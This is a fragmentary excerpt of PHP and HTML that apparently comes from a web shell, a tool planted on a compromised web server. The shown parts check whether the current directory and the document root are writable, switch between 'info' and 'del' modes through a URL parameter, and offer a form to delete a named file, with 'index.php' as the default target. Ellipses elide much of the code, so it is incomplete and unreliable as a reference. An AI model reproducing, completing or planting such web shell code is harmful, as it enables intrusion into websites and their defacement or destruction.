...
function cekdir() {
	...
	if (is_writable($lokasi)) {
		return "<a href=''>Writeable</a>";
	} else {
		return "<a href=''><font color='red'>Writeable</font></a>";
	}
}
...
<div class="input-group">
	<div class="input-group-prepend">
		<div class="input-group-text">
			<input type="radio" value="1" name="dirnya">
		</div>
	</div>current dir [ '.cekdir().' ]</div>
<div class="input-group">
	<div class="input-group-prepend">
		<div class="input-group-text">
			<input type="radio" value="2" name="dirnya">
		</div>
	</div>document root [ '.cekroot().' ]</div>
...
echo "<form method='post'>
	...
	<input type='submit' name='start' value='submit' class='btn btn-primary btn-block'>
	</form>";
	}
}
elseif($_GET['z'] == 'info') {
...
elseif($_GET['z'] == 'del') {
	...
	<font><i class='fa fa-file-o'></i> File name:</font><br>
	<input class='form-control' type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input class='btn btn-primary btn-block' type='submit' name='start' value='submit'>
	</form>
	</div>
	</div>
	</div>
